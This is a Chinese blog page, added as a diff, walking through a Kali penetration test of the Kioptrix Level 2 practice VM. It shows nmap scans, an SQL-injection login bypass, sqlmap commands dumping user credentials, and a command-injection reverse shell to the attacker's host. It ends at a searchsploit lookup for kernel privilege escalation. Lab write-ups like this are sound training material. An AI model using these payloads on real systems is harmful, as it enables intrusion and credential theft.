@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--
+***************  *      *     *
+      8          *    *       *
+      8          *  *         *
+      8          **           *
+      8          *  *         *
+      8          *    *       *
+      8          *      *     *
+      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
+-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+  <title>kali渗透测试:kioptrix level2 | Getuid</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="Getuid">
+    <meta name="author" content="John Doe">
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="Getuid" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            
+        	<li>
+        		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
+            	<ul class="sb-submenu">
+				  	
+				    <li><a href="/categories/hexo/" class="animsition-link">hexo<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/区块链/" class="animsition-link">区块链<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/取证/" class="animsition-link">取证<small>(6)</small></a></li>
+				    
+				    <li><a href="/categories/渗透测试/" class="animsition-link">渗透测试<small>(4)</small></a></li>
+				    
+				</ul>
+        	</li>
+			
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a target="_blank" rel="noopener" href="http://go.kieran.top/" class="animsition-link">Kieran</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="http://domain.com/" class="animsition-link">Name</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">Getuid</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            
+                            
+                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
+                            
+                            
+                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
+                            
+                            
+                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2021-11-19T12:20:10.000Z" itemprop="datePublished">
+          2021-11-19
+      </time>
+    
+    
+    | 
+    <a href='/tags/kali/'>kali</a>
+    
+    
+</span>
+                <h1>kali渗透测试:kioptrix level2</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		<h2><span id="环境准备">环境准备</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali(攻击机)</span><br><span class="line">kioptrix level2(靶机)</span><br></pre></td></tr></table></figure>
+
+<p>前期环境避坑点:靶机默认的是桥接的模式，本地C段扫描可能扫不出</p>
+<p>修改配置：</p>
+<p>修改<strong>Kioptix Level 2.vmx</strong>文件，将ethernet0.networkName的值改为Nat</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ethernet0.networkName = &quot;Nat&quot;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="信息搜集">信息搜集</span></h2><p>用nmap进行C段扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.135.*</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211119202921849.png" alt="image-20211119202921849"></p>
+<p>扫描出目标地址</p>
+<p>扫描目标端口详细信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -A -p- 192.168.135.149</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nmap -sV -A -p- 192.168.135.149                                                                                  </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-19 20:31 CST</span><br><span class="line">Nmap scan report for 192.168.135.149</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)</span><br><span class="line">|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)</span><br><span class="line">|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2            111/tcp   rpcbind</span><br><span class="line">|   100000  2            111/udp   rpcbind</span><br><span class="line">|   100024  1            625/udp   status</span><br><span class="line">|_  100024  1            628/tcp   status</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|_    SSL2_RC4_128_WITH_MD5</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2009-10-08T00:10:47</span><br><span class="line">|_Not valid after:  2010-10-08T00:10:47</span><br><span class="line">|_ssl-date: 2021-11-19T10:21:56+00:00; -2h09m42s from scanner time.</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">628/tcp  open  status   1 (RPC #100024)</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">|_http-server-header: CUPS/1.1</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: PUT</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:53:19:4C (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.30</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -2h09m42s</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.42 ms 192.168.135.149</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.04 seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>操作系统为centOS linux2.6.x 提权、漏洞利用</li>
+<li>80/443端口运行web服务 可进行web渗透测试</li>
+<li>22端口为openssh3.9.p1 可能存在用户枚举漏洞</li>
+<li>111端口为rpc服务 一般可被用来进行Dos攻击</li>
+<li>631 ipp为打印协议  拒绝服务攻击</li>
+<li>3306 mysql</li>
+</ul>
+<h2><span id="web渗透测试">web渗透测试</span></h2><p>既然web服务还运行着，那我们直接去访问</p>
+<p>存在很低级的sql注入漏洞</p>
+<p>万能密码绕过之后可以登录后台</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>但如果我们利用其mysql数据库的漏洞进行后台登录该怎样操作呢？</p>
+<p>我们可以利用burpsuite抓包，然后再利用sqlmap进行探测</p>
+<p>先用burpsuite对登录页面进行抓包并保存在本地桌面</p>
+<p><img src="image-20211119225004286.png" alt="image-20211119225004286"></p>
+<p><img src="image-20211119225044722.png" alt="image-20211119225044722"></p>
+<p>然后用sqlmap调用，进行诸如点探测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r /root/桌面/1.txt --level=3 --risk=3 --batch --dbs</span><br></pre></td></tr></table></figure>
+
+<p>-r +数据包地址 –level 执行探测的等级  –risk 执行探测的风险 –batch 代表所有选项使用sqlmap默认，不用你选择；</p>
+<p>探测出了数据库的名称</p>
+<p><img src="image-20211119232957792.png" alt="image-20211119232957792"></p>
+<p>继续探测数据库的表格、字段、用户账号及密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r /root/桌面/1.txt --level=3 --risk=3 -D webapp -T users -C password,username --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211119233227419.png" alt="image-20211119233227419"></p>
+<p>成功拿到账户信息</p>
+<p>进入后台之后发现存在命令执行</p>
+<p><img src="image-20211119210517946.png" alt="image-20211119210517946"></p>
+<p>我们利用这个ping 的命令执行漏洞来反弹shell</p>
+<p>大佬博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qiuyeyijian/article/details/102993592">几种反弹shell的方式汇总</a></p>
+<p>在kali当中开启对应端口号的监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>利用任意命令执行漏洞反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|| bash -i &gt;&amp; /dev/tcp/192.168.135.128/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/ </p>
+<p>查看当前权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+<p>发现是apache的权限，权限比较低</p>
+<p><img src="image-20211119222232676.png" alt="image-20211119222232676"></p>
+<h2><span id="本地提权">本地提权</span></h2><p>拿到shell之后分别查看内核版本和发行版本，搜索有用信息来进行查找合适的漏洞，进而进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211119222955203.png" alt="image-20211119222955203"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/*elease</span><br></pre></td></tr></table></figure>
+
+<p>发现版本是 2.6.9-55.EL，</p>
+<p>使用searchsploit对该漏洞进行查询</p>
+<p><img src="image-20211119235838484.png" alt="image-20211119235838484"></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2d997a306252">大佬博客全面详细还易懂</a></p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    
+    <a class="pull-right" href="/2021/11/14/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/">
+        永恒之蓝复现 →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By John Doe. All Rights Reserved.
+                </p>
+                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
